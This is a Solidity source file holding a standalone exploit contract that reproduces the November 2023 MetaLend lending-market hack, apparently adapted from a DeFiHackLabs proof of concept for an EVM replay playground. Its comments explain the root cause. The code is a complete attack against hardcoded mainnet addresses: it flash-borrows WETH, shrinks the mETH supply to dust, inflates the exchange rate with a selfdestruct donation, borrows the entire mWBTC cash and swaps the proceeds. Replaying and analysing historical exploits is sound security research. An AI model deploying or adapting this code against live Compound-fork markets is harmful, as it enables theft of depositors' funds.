// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2023-11-MetaLend).
//
// The DeFiHackLabs PoC (test/MetaLend_exp.sol) drives the attack from a
// Foundry `Test`-inheriting contract using cheatcodes: `vm.createSelectFork`
// (fork setup — replaced by the frozen `anvil_state.json`), `vm.label`
// (cosmetic — replaced by the config's `labels`), and `deal(address(this), 0)`
// (zeroes the exploit contract's own ETH balance — a no-op here since a fresh
// scratch-deployed contract already starts at 0 ETH). The replay engine
// executes zero Foundry cheatcodes, so this file drops all of them and keeps
// the exact attack logic verbatim from test/MetaLend_exp.sol.
//
// Root cause (MetaLend is a Compound-V2 / CREAM fork):
//   1. `exchangeRateStoredInternal()` floats with balances once a market's
//      `totalSupply > 0`: rate = (cash + borrows - reserves) * 1e18 / totalSupply.
//      The `initialExchangeRateMantissa` floor only applies while supply == 0.
//   2. `redeem` rounds the burned cToken amount DOWN, so the attacker can
//      collapse `totalSupply` to a non-zero dust value (2 units) instead of 0,
//      keeping the floating-rate branch alive.
//   3. The mETH market is a CEther market: `getCash() == address(this).balance`.
//      A raw `selfdestruct` transfer inflates `cash` without minting any
//      cToken, because it bypasses `receive()`/`payable` checks entirely.
//
// Attack: flash-loan 100 WETH from Spark (Aave-V3 fork) with zero premium,
// unwrap to ETH, mint mETH with 1 ETH (totalSupply = 5e9), redeem down to
// totalSupply = 2 (~0.99999 ETH back), `selfdestruct`-donate the remaining
// ~99.99999... ETH into mETH (cash jumps to ~100 ETH, totalSupply stays at 2 ->
// exchange rate = 5e37), enterMarkets, borrow the ENTIRE mWBTC cash
// (0.10999999 WBTC) against the now-inflated 2-unit mETH "collateral",
// `redeemUnderlying` to reclaim the donated/seed ETH, swap the stolen WBTC to
// WETH on Uniswap V2, and repay the flash loan. Net profit: 1.9841441 WETH.

interface IAaveFlashloanSimple {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

// CEther market (mETH) — Compound-V2/CREAM-fork native-asset market.
interface ICEther {
    function mint() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function totalSupply() external view returns (uint256);
    function getCash() external view returns (uint256);
}

// CErc20 market (mWBTC).
interface ICErc20 {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

contract MetaLendExploit {
    IAaveFlashloanSimple private constant Spark = IAaveFlashloanSimple(0xC13e21B648A5Ee794902342038FF3aDAB66BE987);
    IUniswapV2Router02 private constant Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ICErc20 private constant mWBTC = ICErc20(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E);
    ICEther private constant mETH = ICEther(payable(0x5578f2E245e932a599c46215a0cA88707230F17B));
    IComptroller private constant Comptroller = IComptroller(0x0ee4b2C533ED3fFbd9f04CD7E812A4041bbE89f6);

    uint256 private constant FLASH_AMOUNT = 100e18;

    // Attacker-facing entrypoint: flash-borrow the seed capital, everything
    // else runs inside the flash-loan callback below. (The original PoC ran
    // the exchange-rate manipulation through a separate `Helper` contract
    // funded with the unwrapped ETH; that logic is inlined directly here
    // instead — functionally identical, since MetaLend's Comptroller/CToken
    // checks are per-caller and don't care whether the caller is a top-level
    // contract or a nested one. Only `Donator` stays a separate deployment,
    // because SELFDESTRUCT terminates its own call frame and would abort the
    // rest of the attack if performed by this contract directly.)
    function run() external {
        Spark.flashLoanSimple(address(this), address(WETH), FLASH_AMOUNT, bytes(""), 0);
    }

    // Aave-V3-style flash-loan callback.
    function executeOperation(
        address, /* asset */
        uint256 amount,
        uint256, /* premium */
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        WETH.withdraw(WETH.balanceOf(address(this)));
        _donateAndBorrow();
        WETH.deposit{value: address(this).balance}();
        WBTC.approve(address(Router), type(uint256).max);
        _swapWBTCToWETH();
        WETH.approve(address(Spark), amount);
        return true;
    }

    receive() external payable {}

    // The core exchange-rate manipulation + cross-market borrow, run with the
    // ~100 ETH unwrapped from the flash loan.
    function _donateAndBorrow() private {
        // Seed the market: mint 5e9 mETH with 1 ETH.
        mETH.mint{value: 1 ether}();
        // Redeem all-but-2 units — `redeem` rounds the returned underlying
        // DOWN, so totalSupply lands at 2 (not 0), keeping the floating-rate
        // branch of exchangeRateStoredInternal alive.
        uint256 redeemAmount = mETH.totalSupply() - 2;
        mETH.redeem(redeemAmount);
        // Force-donate the remaining ~99.99999... ETH into mETH via
        // selfdestruct — this bypasses receive()/payable checks entirely and
        // inflates `cash` (== address(this).balance for a CEther market)
        // WITHOUT minting any cToken. totalSupply stays at 2; exchange rate
        // rockets to ~5e37.
        Donator donator = new Donator();
        donator.sendETHTo{value: address(this).balance}(address(mETH));
        // The 2 surviving mETH units now look like ~100 ETH of collateral.
        address[] memory mTokens = new address[](1);
        mTokens[0] = address(mETH);
        Comptroller.enterMarkets(mTokens);
        // Drain the ENTIRE mWBTC market cash against that inflated collateral.
        // Borrowed WBTC lands directly on address(this) — no forwarding step
        // needed since this contract is now the borrower itself.
        uint256 underlyingWBTCAmount = mWBTC.getCash();
        mWBTC.borrow(underlyingWBTCAmount - 1);
        // Reclaim the seed/donation ETH by redeeming the underlying back out.
        mETH.redeemUnderlying(mETH.getCash() - 1);
    }

    function _swapWBTCToWETH() private {
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000);
    }
}

// Forces an unrejectable ETH transfer via SELFDESTRUCT.
contract Donator {
    function sendETHTo(
        address to
    ) external payable {
        selfdestruct(payable(to));
    }
}
